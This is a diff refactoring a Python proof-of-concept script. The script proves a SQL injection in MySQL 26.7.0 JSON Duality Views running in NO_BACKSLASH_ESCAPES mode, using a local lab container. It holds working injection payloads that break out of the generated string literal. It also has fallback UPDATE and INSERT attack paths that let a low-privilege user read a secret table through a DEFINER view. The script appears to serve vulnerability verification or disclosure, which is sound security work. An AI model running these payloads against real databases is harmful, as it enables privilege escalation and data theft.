@@ -227,27 +227,96 @@ _builtins.print = _cprint
 """Prove JSON Duality DEFINER DML SQLi under NO_BACKSLASH_ESCAPES on mysql 26.7.0."""
 
 import json
-import os
-import sys
+from dataclasses import dataclass
+from typing import Any, NamedTuple
 
 import pymysql
 
-WITNESS = "MYSQL-JDV-DEFINER-SQLI-WITNESS"
-LABEL = "mysql-jdv-definer-sqli"
-IMAGE_TAG = "mysql:26.7.0"
-HOST = "127.0.0.1"
-PORT = 18640
-VICTIM_USER = "victim"
-VICTIM_PASS = "victimpass"
 
-# SET-list injection for generated UPDATE ... SET `name` = _utf8mb4 '<esc>'
+@dataclass(frozen=True)
+class LabConfig:
+    label: str = "mysql-jdv-definer-sqli"
+    witness: str = "MYSQL-JDV-DEFINER-SQLI-WITNESS"
+    image: str = "mysql:26.7.0"
+    dump_version: str = "26.7.0"
+    host: str = "127.0.0.1"
+    port: int = 18640
+    root_user: str = "root"
+    root_password: str = "labroot"
+    victim_user: str = "victim"
+    victim_password: str = "victimpass"
+    charset: str = "utf8mb4"
+    connect_timeout: int = 10
+    read_timeout: int = 60
+    write_timeout: int = 30
+
+
+CFG = LabConfig()
+LABEL = CFG.label
+WITNESS = CFG.witness
+IMAGE_TAG = CFG.image
+HOST = CFG.host
+PORT = CFG.port
+VICTIM_USER = CFG.victim_user
+VICTIM_PASS = CFG.victim_password
+
+ER_PARSE_ERROR = 1064
+ER_TABLE_EXISTS_ERROR = 1050
+ER_NO_SUCH_TABLE = 1146
+ER_WRONG_OBJECT = 1347
+ER_NONEXISTING_GRANT = 1141
+ER_TABLEACCESS_DENIED_ERROR = 1142
+ER_COLUMNACCESS_DENIED_ERROR = 1143
+CREATE_VIEW_RETRY_ERRNOS = frozenset(
+    {ER_PARSE_ERROR, ER_NO_SUCH_TABLE, ER_WRONG_OBJECT}
+)
+SECRET_DENIED_ERRNOS = frozenset(
+    {
+        ER_NONEXISTING_GRANT,
+        ER_TABLEACCESS_DENIED_ERROR,
+        ER_COLUMNACCESS_DENIED_ERROR,
+    }
+)
+
+ROW_ID = 1
+INSERT_ID = 2
+INSERT_SETLIST_ID = 4
+RESET_NAME = "ok"
+SQL_MODE_NBE = "NO_BACKSLASH_ESCAPES"
+
 # escape_string_for_mysql turns ' into \'. With NO_BACKSLASH_ESCAPES that
-# backslash-quote ends the literal. -- comments the leftover closer + WHERE.
+# backslash-quote ends the generated _utf8mb4 literal.
 INJECT_NAME = "x', name=(SELECT note FROM secret.s LIMIT 1)-- "
 NBE_INJECT_NAME = "z', name=(SELECT note FROM secret.s LIMIT 1)-- "
-
-# VALUES injection for generated INSERT ... VALUES (id, _utf8mb4 '<esc>')
 INSERT_INJECT_NAME = "x'), (3, (SELECT note FROM secret.s LIMIT 1))-- "
+
+JSON_DUALITY_SELECT = (
+    "SELECT JSON_DUALITY_OBJECT(WITH (INSERT, UPDATE, DELETE) "
+    '"_id" : id, "name" : name) FROM app.t'
+)
+# SQL SECURITY DEFINER between the view name and AS is 1064; default is DEFINER.
+CREATE_VIEW_ATTEMPTS = (
+    f"CREATE JSON DUALITY VIEW app.dv SQL SECURITY DEFINER AS {JSON_DUALITY_SELECT}",
+    f"CREATE JSON DUALITY VIEW app.dv AS {JSON_DUALITY_SELECT}",
+    (
+        "CREATE JSON RELATIONAL DUALITY VIEW app.dv "
+        f"SQL SECURITY DEFINER AS {JSON_DUALITY_SELECT}"
+    ),
+)
+
+
+class SqlResult(NamedTuple):
+    ok: bool
+    errno: int | None
+    msg: str
+
+
+class ViewSnapshot(NamedTuple):
+    ok: bool
+    errno: int | None
+    msg: str
+    names: list[str]
+    rows: list[str]
 
 
 def log(msg: str) -> None:
@@ -259,36 +328,40 @@ def fail(reason: str) -> None:
     raise SystemExit(1)
 
 
-def connect(user: str, password: str, database=None):
+def connect(
+    user: str,
+    password: str,
+    database: str | None = None,
+) -> pymysql.connections.Connection:
     return pymysql.connect(
-        host=HOST,
-        port=PORT,
+        host=CFG.host,
+        port=CFG.port,
         user=user,
         password=password,
         database=database,
         autocommit=True,
-        charset="utf8mb4",
-        connect_timeout=10,
-        read_timeout=60,
-        write_timeout=30,
+        charset=CFG.charset,
+        connect_timeout=CFG.connect_timeout,
+        read_timeout=CFG.read_timeout,
+        write_timeout=CFG.write_timeout,
         client_flag=0,
     )
 
 
-def fetch_one(cur, sql: str):
+def fetch_one(cur: Any, sql: str) -> Any:
     cur.execute(sql)
     row = cur.fetchone()
     return None if row is None else row[0]
 
 
-def exec_try(cur, sql: str):
+def exec_try(cur: Any, sql: str) -> SqlResult:
     try:
         cur.execute(sql)
-        return True, None, "ok"
+        return SqlResult(True, None, "ok")
     except pymysql.Error as exc:
         errno = exc.args[0] if exc.args else None
         msg = exc.args[1] if len(exc.args) > 1 else str(exc)
-        return False, errno, str(msg)
+        return SqlResult(False, errno, str(msg))
 
 
 def sql_quote(value: str) -> str:
@@ -296,7 +369,7 @@ def sql_quote(value: str) -> str:
     return "'" + value.replace("'", "''") + "'"
 
 
-def as_text(value) -> str:
+def as_text(value: Any) -> str:
     if value is None:
         return ""
     if isinstance(value, (bytes, bytearray)):
@@ -306,7 +379,7 @@ def as_text(value) -> str:
     return str(value)
 
 
-def parse_json(value):
+def parse_json(value: Any) -> Any:
     if value is None:
         return None
     if isinstance(value, dict):
@@ -318,60 +391,303 @@ def parse_json(value):
         return None
 
 
-def inject_doc(row_id: int, etag=None, name: str = INJECT_NAME) -> str:
-    doc = {"_id": row_id, "name": name}
+def inject_doc(
+    row_id: int,
+    etag: str | None = None,
+    name: str = INJECT_NAME,
+) -> str:
+    doc: dict[str, Any] = {"_id": row_id, "name": name}
     if etag:
         doc["_metadata"] = {"etag": etag}
     return json.dumps(doc, separators=(",", ":"))
 
 
-def view_rows(cur):
-    ok, errno, msg = exec_try(cur, "SELECT data FROM app.dv")
-    if not ok:
-        return False, errno, msg, []
-    rows = []
+def view_update_sql(row_id: int, doc: str) -> str:
+    return (
+        f"UPDATE app.dv SET data = {sql_quote(doc)} "
+        f"WHERE JSON_EXTRACT(data, '$._id') = {int(row_id)}"
+    )
+
+
+def view_insert_sql(doc: str) -> str:
+    return f"INSERT INTO app.dv VALUES ({sql_quote(doc)})"
+
+
+def view_rows(cur: Any) -> tuple[bool, int | None, str, list[str]]:
+    result = exec_try(cur, "SELECT data FROM app.dv")
+    if not result.ok:
+        return False, result.errno, result.msg, []
+    rows: list[str] = []
     for row in cur.fetchall():
         rows.append(as_text(row[0] if row else None))
     return True, None, "ok", rows
 
 
-def names_from_view(cur):
+def names_from_view(cur: Any) -> ViewSnapshot:
     ok, errno, msg, rows = view_rows(cur)
-    names = []
+    names: list[str] = []
     if not ok:
-        return False, errno, msg, names, rows
+        return ViewSnapshot(False, errno, msg, names, rows)
     for raw in rows:
         obj = parse_json(raw)
         if isinstance(obj, dict) and "name" in obj:
             names.append(as_text(obj.get("name")))
             continue
         names.append(raw)
-    return True, None, "ok", names, rows
+    return ViewSnapshot(True, None, "ok", names, rows)
 
 
-def etag_for_id(cur, row_id: int):
+def etag_for_id(cur: Any, row_id: int) -> tuple[str | None, int | None, str]:
     sql = (
         "SELECT JSON_UNQUOTE(JSON_EXTRACT(data, '$._metadata.etag')) "
         f"FROM app.dv WHERE JSON_EXTRACT(data, '$._id') = {int(row_id)}"
     )
-    ok, errno, msg = exec_try(cur, sql)
-    if not ok:
-        return None, errno, msg
+    result = exec_try(cur, sql)
+    if not result.ok:
+        return None, result.errno, result.msg
     row = cur.fetchone()
     if not row or row[0] is None:
         return None, None, "missing-etag"
     return as_text(row[0]), None, "ok"
 
 
-def dml_view(cur, sql: str):
+def dml_view(cur: Any, sql: str) -> SqlResult:
     return exec_try(cur, sql)
+
+
+def run_statements(cur: Any, stmts: list[str], kind: str) -> None:
+    for stmt in stmts:
+        result = exec_try(cur, stmt)
+        log(
+            f"{kind} {'ok' if result.ok else 'fail'} errno={result.errno} "
+            f"stmt={stmt!r} msg={result.msg!r}"
+        )
+        if not result.ok:
+            fail(f"{kind}-failed stmt={stmt!r} errno={result.errno} {result.msg}")
+
+
+def create_duality_view(cur: Any) -> str:
+    create_ok = False
+    create_errno: int | None = None
+    create_msg: str | None = None
+    create_used: str | None = None
+    for stmt in CREATE_VIEW_ATTEMPTS:
+        result = exec_try(cur, stmt)
+        log(
+            f"CREATE VIEW attempt ok={result.ok} errno={result.errno} "
+            f"stmt={stmt!r} msg={result.msg!r}"
+        )
+        if result.ok:
+            create_ok = True
+            create_used = stmt
+            create_errno = None
+            create_msg = "ok"
+            break
+        create_errno = result.errno
+        create_msg = result.msg
+        if result.errno in CREATE_VIEW_RETRY_ERRNOS or (
+            result.msg
+            and "duality" in result.msg.lower()
+            and "syntax" in result.msg.lower()
+        ):
+            continue
+        if result.errno == ER_TABLE_EXISTS_ERROR:
+            create_ok = True
+            create_used = stmt
+            create_msg = "already-exists"
+            break
+
+    log(
+        f"IOC CREATE VIEW ok={create_ok} errno={create_errno} "
+        f"used={create_used!r} msg={create_msg!r}"
+    )
+    if not create_ok:
+        fail(f"jdv-create-failed errno={create_errno} {create_msg}")
+    assert create_used is not None
+    return create_used
+
+
+def seed_schema(cur: Any) -> None:
+    run_statements(
+        cur,
+        [
+            "CREATE DATABASE app",
+            "CREATE DATABASE secret",
+            "CREATE TABLE app.t (id INT PRIMARY KEY, name VARCHAR(512) NOT NULL)",
+            "CREATE TABLE secret.s (id INT PRIMARY KEY, note VARCHAR(128) NOT NULL)",
+            f"INSERT INTO secret.s VALUES ({ROW_ID}, {sql_quote(WITNESS)})",
+            f"INSERT INTO app.t VALUES ({ROW_ID}, {sql_quote(RESET_NAME)})",
+        ],
+        "seed",
+    )
+
+
+def show_create_view(cur: Any) -> None:
+    result = exec_try(cur, "SHOW CREATE VIEW app.dv")
+    show_create = None
+    if result.ok:
+        row = cur.fetchone()
+        show_create = as_text(row[1] if row and len(row) > 1 else row)
+    log(f"SHOW CREATE VIEW errno={result.errno} sql={show_create!r}")
+
+
+def grant_victim(cur: Any) -> None:
+    run_statements(
+        cur,
+        [
+            f"CREATE USER '{VICTIM_USER}'@'%' IDENTIFIED BY '{VICTIM_PASS}'",
+            f"GRANT SELECT, INSERT, UPDATE ON app.dv TO '{VICTIM_USER}'@'%'",
+            "FLUSH PRIVILEGES",
+        ],
+        "user-seed",
+    )
+    result = exec_try(cur, f"SHOW GRANTS FOR '{VICTIM_USER}'@'%'")
+    grants = None
+    if result.ok:
+        grants = [as_text(row[0]) for row in cur.fetchall()]
+    log(f"IOC victim grant errno={result.errno} grants={grants!r}")
+
+
+def assert_secret_denied(cur: Any) -> None:
+    secret_ok, secret_errno, secret_msg = exec_try(cur, "SELECT note FROM secret.s")
+    log(
+        f"IOC secret-direct ok={secret_ok} errno={secret_errno} msg={secret_msg!r}"
+    )
+    if secret_ok:
+        fail("victim-secret=allowed expected-denied")
+    if secret_errno not in SECRET_DENIED_ERRNOS:
+        log(f"secret-direct-errno-class={secret_errno} (expected 1142-class)")
+
+
+def prove_default_mode_literal(cur: Any) -> None:
+    default_mode = fetch_one(cur, "SELECT @@SESSION.sql_mode")
+    log(f"IOC sql_mode default={default_mode!r}")
+
+    snap = names_from_view(cur)
+    log(
+        f"view-before ok={snap.ok} errno={snap.errno} "
+        f"names={snap.names!r} json={snap.rows!r}"
+    )
+    if not snap.ok:
+        fail(f"view-select-failed errno={snap.errno} {snap.msg}")
+
+    etag, etag_errno, etag_msg = etag_for_id(cur, ROW_ID)
+    log(f"etag-id1={etag!r} errno={etag_errno} msg={etag_msg!r}")
+
+    # Same JSON under default sql_mode stores as a literal name.
+    neg_sql = view_update_sql(ROW_ID, inject_doc(ROW_ID, etag=etag))
+    neg_ok, neg_errno, neg_msg = dml_view(cur, neg_sql)
+    log(
+        f"IOC default-mode UPDATE ok={neg_ok} errno={neg_errno} "
+        f"msg={neg_msg!r} sql={neg_sql!r}"
+    )
+    if not neg_ok:
+        ins_sql = view_insert_sql(inject_doc(INSERT_ID, name=INJECT_NAME))
+        ins_ok, ins_errno, ins_msg = dml_view(cur, ins_sql)
+        log(
+            f"IOC default-mode INSERT ok={ins_ok} errno={ins_errno} "
+            f"msg={ins_msg!r} sql={ins_sql!r}"
+        )
+
+    snap = names_from_view(cur)
+    log(
+        f"IOC default-mode view ok={snap.ok} errno={snap.errno} "
+        f"names={snap.names!r} json={snap.rows!r}"
+    )
+    if any(WITNESS in name for name in snap.names):
+        fail("default-mode-inject=yes expected-no")
+
+    # Same projected name is skipped (is_equal); NBE must use a different value.
+    etag, etag_errno, etag_msg = etag_for_id(cur, ROW_ID)
+    reset_sql = view_update_sql(
+        ROW_ID, inject_doc(ROW_ID, etag=etag, name=RESET_NAME)
+    )
+    reset_ok, reset_errno, reset_msg = dml_view(cur, reset_sql)
+    log(
+        f"reset-after-negative ok={reset_ok} errno={reset_errno} "
+        f"msg={reset_msg!r} etag={etag!r}"
+    )
+    if not reset_ok:
+        fail(f"reset-after-negative-failed errno={reset_errno} {reset_msg}")
+    snap = names_from_view(cur)
+    log(f"view-after-reset ok={snap.ok} names={snap.names!r} json={snap.rows!r}")
+
+
+def prove_nbe_witness(cur: Any) -> None:
+    result = exec_try(cur, f"SET SESSION sql_mode='{SQL_MODE_NBE}'")
+    log(f"SET NBE ok={result.ok} errno={result.errno} msg={result.msg!r}")
+    if not result.ok:
+        fail(f"set-nbe-failed errno={result.errno} {result.msg}")
+    nbe_mode = fetch_one(cur, "SELECT @@SESSION.sql_mode")
+    log(f"IOC sql_mode nbe={nbe_mode!r}")
+    if SQL_MODE_NBE not in str(nbe_mode or ""):
+        fail(f"nbe-not-set sql_mode={nbe_mode!r}")
+
+    etag, etag_errno, etag_msg = etag_for_id(cur, ROW_ID)
+    log(f"nbe-etag-id1={etag!r} errno={etag_errno} msg={etag_msg!r}")
+    nbe_sql = view_update_sql(
+        ROW_ID, inject_doc(ROW_ID, etag=etag, name=NBE_INJECT_NAME)
+    )
+    nbe_ok, nbe_errno, nbe_msg = dml_view(cur, nbe_sql)
+    log(
+        f"IOC NBE UPDATE ok={nbe_ok} errno={nbe_errno} "
+        f"msg={nbe_msg!r} sql={nbe_sql!r}"
+    )
+    nbe_method = "UPDATE"
+
+    if not nbe_ok:
+        nbe_sql2 = view_update_sql(ROW_ID, inject_doc(ROW_ID))
+        nbe_ok, nbe_errno, nbe_msg = dml_view(cur, nbe_sql2)
+        log(
+            f"IOC NBE UPDATE-no-etag ok={nbe_ok} errno={nbe_errno} "
+            f"msg={nbe_msg!r} sql={nbe_sql2!r}"
+        )
+        nbe_method = "UPDATE-no-etag"
+
+    if not nbe_ok:
+        ins_sql = view_insert_sql(inject_doc(INSERT_ID, name=INSERT_INJECT_NAME))
+        nbe_ok, nbe_errno, nbe_msg = dml_view(cur, ins_sql)
+        log(
+            f"IOC NBE INSERT ok={nbe_ok} errno={nbe_errno} "
+            f"msg={nbe_msg!r} sql={ins_sql!r}"
+        )
+        nbe_method = "INSERT"
+
+    if not nbe_ok:
+        ins_sql = view_insert_sql(
+            inject_doc(INSERT_SETLIST_ID, name=INJECT_NAME)
+        )
+        nbe_ok, nbe_errno, nbe_msg = dml_view(cur, ins_sql)
+        log(
+            f"IOC NBE INSERT-setlist ok={nbe_ok} errno={nbe_errno} "
+            f"msg={nbe_msg!r} sql={ins_sql!r}"
+        )
+        nbe_method = "INSERT-setlist"
+
+    log(
+        f"IOC NBE DML method={nbe_method} ok={nbe_ok} errno={nbe_errno} "
+        f"msg={nbe_msg!r}"
+    )
+
+    snap = names_from_view(cur)
+    log(
+        f"IOC NBE view ok={snap.ok} errno={snap.errno} "
+        f"names={snap.names!r} json={snap.rows!r}"
+    )
+    if not snap.ok:
+        fail(f"nbe-view-select-failed errno={snap.errno} {snap.msg}")
+    if not any(WITNESS in name for name in snap.names):
+        fail(
+            f"view-has-witness=no nbe-inject={'yes' if nbe_ok else 'no'} "
+            f"method={nbe_method} errno={nbe_errno} names={snap.names!r}"
+        )
 
 
 def main() -> None:
     log(f"lab={LABEL} image={IMAGE_TAG} host={HOST} port={PORT}")
 
     try:
-        root = connect("root", "labroot")
+        root = connect(CFG.root_user, CFG.root_password)
     except pymysql.Error as exc:
         fail(f"root-connect-failed errno={exc.args[0] if exc.args else '?'} {exc}")
 
@@ -379,96 +695,12 @@ def main() -> None:
         rcur = root.cursor()
         version = str(fetch_one(rcur, "SELECT VERSION()") or "")
         log(f"mysqld-version={version!r}")
-        if "26.7.0" not in version:
+        if CFG.dump_version not in version:
             fail(f"version-mismatch version={version!r} image={IMAGE_TAG}")
-
-        seed = [
-            "CREATE DATABASE app",
-            "CREATE DATABASE secret",
-            "CREATE TABLE app.t (id INT PRIMARY KEY, name VARCHAR(512) NOT NULL)",
-            "CREATE TABLE secret.s (id INT PRIMARY KEY, note VARCHAR(128) NOT NULL)",
-            f"INSERT INTO secret.s VALUES (1, {sql_quote(WITNESS)})",
-            "INSERT INTO app.t VALUES (1, 'ok')",
-        ]
-        for stmt in seed:
-            ok, errno, msg = exec_try(rcur, stmt)
-            log(f"seed {'ok' if ok else 'fail'} errno={errno} stmt={stmt!r} msg={msg!r}")
-            if not ok:
-                fail(f"seed-failed stmt={stmt!r} errno={errno} {msg}")
-
-        create_stmts = [
-            (
-                "CREATE JSON DUALITY VIEW app.dv SQL SECURITY DEFINER AS "
-                "SELECT JSON_DUALITY_OBJECT(WITH (INSERT, UPDATE, DELETE) "
-                '"_id" : id, "name" : name) FROM app.t'
-            ),
-            (
-                "CREATE JSON DUALITY VIEW app.dv AS "
-                "SELECT JSON_DUALITY_OBJECT(WITH (INSERT, UPDATE, DELETE) "
-                '"_id" : id, "name" : name) FROM app.t'
-            ),
-            (
-                "CREATE JSON RELATIONAL DUALITY VIEW app.dv "
-                "SQL SECURITY DEFINER AS "
-                "SELECT JSON_DUALITY_OBJECT(WITH (INSERT, UPDATE, DELETE) "
-                '"_id" : id, "name" : name) FROM app.t'
-            ),
-        ]
-        create_ok = False
-        create_errno = None
-        create_msg = None
-        create_used = None
-        for stmt in create_stmts:
-            ok, errno, msg = exec_try(rcur, stmt)
-            log(f"CREATE VIEW attempt ok={ok} errno={errno} stmt={stmt!r} msg={msg!r}")
-            if ok:
-                create_ok = True
-                create_used = stmt
-                create_errno = None
-                create_msg = "ok"
-                break
-            create_errno = errno
-            create_msg = msg
-            if errno in (1064, 1146, 1347) or (
-                msg and "duality" in msg.lower() and "syntax" in msg.lower()
-            ):
-                continue
-            if errno == 1050:
-                create_ok = True
-                create_used = stmt
-                create_msg = "already-exists"
-                break
-
-        log(
-            f"IOC CREATE VIEW ok={create_ok} errno={create_errno} "
-            f"used={create_used!r} msg={create_msg!r}"
-        )
-        if not create_ok:
-            fail(f"jdv-create-failed errno={create_errno} {create_msg}")
-
-        show_create = None
-        ok, errno, msg = exec_try(rcur, "SHOW CREATE VIEW app.dv")
-        if ok:
-            row = rcur.fetchone()
-            show_create = as_text(row[1] if row and len(row) > 1 else row)
-        log(f"SHOW CREATE VIEW errno={errno} sql={show_create!r}")
-
-        user_seed = [
-            f"CREATE USER '{VICTIM_USER}'@'%' IDENTIFIED BY '{VICTIM_PASS}'",
-            f"GRANT SELECT, INSERT, UPDATE ON app.dv TO '{VICTIM_USER}'@'%'",
-            "FLUSH PRIVILEGES",
-        ]
-        for stmt in user_seed:
-            ok, errno, msg = exec_try(rcur, stmt)
-            log(f"user-seed {'ok' if ok else 'fail'} errno={errno} stmt={stmt!r} msg={msg!r}")
-            if not ok:
-                fail(f"user-seed-failed stmt={stmt!r} errno={errno} {msg}")
-
-        grants = None
-        ok, errno, msg = exec_try(rcur, f"SHOW GRANTS FOR '{VICTIM_USER}'@'%'")
-        if ok:
-            grants = [as_text(row[0]) for row in rcur.fetchall()]
-        log(f"IOC victim grant errno={errno} grants={grants!r}")
+        seed_schema(rcur)
+        create_duality_view(rcur)
+        show_create_view(rcur)
+        grant_victim(rcur)
         rcur.close()
 
     try:
@@ -481,75 +713,8 @@ def main() -> None:
         current_user = fetch_one(vcur, "SELECT CURRENT_USER()")
         session_user = fetch_one(vcur, "SELECT USER()")
         log(f"victim-current-user={current_user!r} session-user={session_user!r}")
-
-        secret_ok, secret_errno, secret_msg = exec_try(
-            vcur, "SELECT note FROM secret.s"
-        )
-        log(
-            f"IOC secret-direct ok={secret_ok} errno={secret_errno} msg={secret_msg!r}"
-        )
-        if secret_ok:
-            fail("victim-secret=allowed expected-denied")
-        if secret_errno not in (1142, 1143, 1141):
-            log(f"secret-direct-errno-class={secret_errno} (expected 1142-class)")
-
-        default_mode = fetch_one(vcur, "SELECT @@SESSION.sql_mode")
-        log(f"IOC sql_mode default={default_mode!r}")
-
-        ok, errno, msg, names, rows = names_from_view(vcur)
-        log(f"view-before ok={ok} errno={errno} names={names!r} json={rows!r}")
-        if not ok:
-            fail(f"view-select-failed errno={errno} {msg}")
-
-        etag, etag_errno, etag_msg = etag_for_id(vcur, 1)
-        log(f"etag-id1={etag!r} errno={etag_errno} msg={etag_msg!r}")
-
-        # Negative: same payload without NO_BACKSLASH_ESCAPES.
-        neg_doc = inject_doc(1, etag=etag)
-        neg_sql = (
-            f"UPDATE app.dv SET data = {sql_quote(neg_doc)} "
-            "WHERE JSON_EXTRACT(data, '$._id') = 1"
-        )
-        neg_ok, neg_errno, neg_msg = dml_view(vcur, neg_sql)
-        log(
-            f"IOC default-mode UPDATE ok={neg_ok} errno={neg_errno} "
-            f"msg={neg_msg!r} sql={neg_sql!r}"
-        )
-        if not neg_ok:
-            ins_doc = inject_doc(2, name=INJECT_NAME)
-            ins_sql = f"INSERT INTO app.dv VALUES ({sql_quote(ins_doc)})"
-            ins_ok, ins_errno, ins_msg = dml_view(vcur, ins_sql)
-            log(
-                f"IOC default-mode INSERT ok={ins_ok} errno={ins_errno} "
-                f"msg={ins_msg!r} sql={ins_sql!r}"
-            )
-            neg_ok, neg_errno, neg_msg = ins_ok, ins_errno, ins_msg
-
-        ok, errno, msg, names, rows = names_from_view(vcur)
-        log(
-            f"IOC default-mode view ok={ok} errno={errno} names={names!r} json={rows!r}"
-        )
-        default_has_witness = any(WITNESS in n for n in names)
-        if default_has_witness:
-            fail("default-mode-inject=yes expected-no")
-
-        # Reset name so the NBE document is not skipped as unchanged.
-        etag, etag_errno, etag_msg = etag_for_id(vcur, 1)
-        reset_doc = inject_doc(1, etag=etag, name="ok")
-        reset_sql = (
-            f"UPDATE app.dv SET data = {sql_quote(reset_doc)} "
-            "WHERE JSON_EXTRACT(data, '$._id') = 1"
-        )
-        reset_ok, reset_errno, reset_msg = dml_view(vcur, reset_sql)
-        log(
-            f"reset-after-negative ok={reset_ok} errno={reset_errno} "
-            f"msg={reset_msg!r} etag={etag!r}"
-        )
-        if not reset_ok:
-            fail(f"reset-after-negative-failed errno={reset_errno} {reset_msg}")
-        ok, errno, msg, names, rows = names_from_view(vcur)
-        log(f"view-after-reset ok={ok} names={names!r} json={rows!r}")
-
+        assert_secret_denied(vcur)
+        prove_default_mode_literal(vcur)
         vcur.close()
 
     try:
@@ -557,92 +722,14 @@ def main() -> None:
     except pymysql.Error as exc:
         fail(f"victim-nbe-connect-failed errno={exc.args[0] if exc.args else '?'} {exc}")
 
-    nbe_method = None
-    nbe_errno = None
-    nbe_msg = None
     with victim_nbe:
         vcur = victim_nbe.cursor()
-        ok, errno, msg = exec_try(
-            vcur, "SET SESSION sql_mode='NO_BACKSLASH_ESCAPES'"
-        )
-        log(f"SET NBE ok={ok} errno={errno} msg={msg!r}")
-        if not ok:
-            fail(f"set-nbe-failed errno={errno} {msg}")
-        nbe_mode = fetch_one(vcur, "SELECT @@SESSION.sql_mode")
-        log(f"IOC sql_mode nbe={nbe_mode!r}")
-        if "NO_BACKSLASH_ESCAPES" not in str(nbe_mode or ""):
-            fail(f"nbe-not-set sql_mode={nbe_mode!r}")
-
-        etag, etag_errno, etag_msg = etag_for_id(vcur, 1)
-        log(f"nbe-etag-id1={etag!r} errno={etag_errno} msg={etag_msg!r}")
-        nbe_doc = inject_doc(1, etag=etag, name=NBE_INJECT_NAME)
-        nbe_sql = (
-            f"UPDATE app.dv SET data = {sql_quote(nbe_doc)} "
-            "WHERE JSON_EXTRACT(data, '$._id') = 1"
-        )
-        nbe_ok, nbe_errno, nbe_msg = dml_view(vcur, nbe_sql)
-        log(
-            f"IOC NBE UPDATE ok={nbe_ok} errno={nbe_errno} "
-            f"msg={nbe_msg!r} sql={nbe_sql!r}"
-        )
-        nbe_method = "UPDATE"
-
-        if not nbe_ok:
-            # Retry UPDATE without etag, then INSERT of a new _id.
-            nbe_doc2 = inject_doc(1)
-            nbe_sql2 = (
-                f"UPDATE app.dv SET data = {sql_quote(nbe_doc2)} "
-                "WHERE JSON_EXTRACT(data, '$._id') = 1"
-            )
-            nbe_ok, nbe_errno, nbe_msg = dml_view(vcur, nbe_sql2)
-            log(
-                f"IOC NBE UPDATE-no-etag ok={nbe_ok} errno={nbe_errno} "
-                f"msg={nbe_msg!r} sql={nbe_sql2!r}"
-            )
-            nbe_method = "UPDATE-no-etag"
-
-        if not nbe_ok:
-            ins_doc = inject_doc(2, name=INSERT_INJECT_NAME)
-            ins_sql = f"INSERT INTO app.dv VALUES ({sql_quote(ins_doc)})"
-            nbe_ok, nbe_errno, nbe_msg = dml_view(vcur, ins_sql)
-            log(
-                f"IOC NBE INSERT ok={nbe_ok} errno={nbe_errno} "
-                f"msg={nbe_msg!r} sql={ins_sql!r}"
-            )
-            nbe_method = "INSERT"
-
-        if not nbe_ok:
-            ins_doc = inject_doc(4, name=INJECT_NAME)
-            ins_sql = f"INSERT INTO app.dv VALUES ({sql_quote(ins_doc)})"
-            nbe_ok, nbe_errno, nbe_msg = dml_view(vcur, ins_sql)
-            log(
-                f"IOC NBE INSERT-setlist ok={nbe_ok} errno={nbe_errno} "
-                f"msg={nbe_msg!r} sql={ins_sql!r}"
-            )
-            nbe_method = "INSERT-setlist"
-
-        log(
-            f"IOC NBE DML method={nbe_method} ok={nbe_ok} errno={nbe_errno} "
-            f"msg={nbe_msg!r}"
-        )
-
-        ok, errno, msg, names, rows = names_from_view(vcur)
-        log(f"IOC NBE view ok={ok} errno={errno} names={names!r} json={rows!r}")
-        if not ok:
-            fail(f"nbe-view-select-failed errno={errno} {msg}")
-        view_has_witness = any(WITNESS in n for n in names)
-        if not view_has_witness:
-            fail(
-                f"view-has-witness=no nbe-inject={'yes' if nbe_ok else 'no'} "
-                f"method={nbe_method} errno={nbe_errno} names={names!r}"
-            )
-
+        prove_nbe_witness(vcur)
         vcur.close()
 
-    dump_ver = "26.7.0"
     log(
         f"SUCCESS {LABEL} victim-secret=denied nbe-inject=yes "
-        f"view-has-witness=yes default-mode-inject=no dump={dump_ver} "
+        f"view-has-witness=yes default-mode-inject=no dump={CFG.dump_version} "
         f"image={IMAGE_TAG} {WITNESS}"
     )
 
@@ -654,5 +741,4 @@ if __name__ == "__main__":
         raise
     except Exception as exc:
         fail(f"exception={type(exc).__name__}:{exc}")
-        sys.exit(1)
 
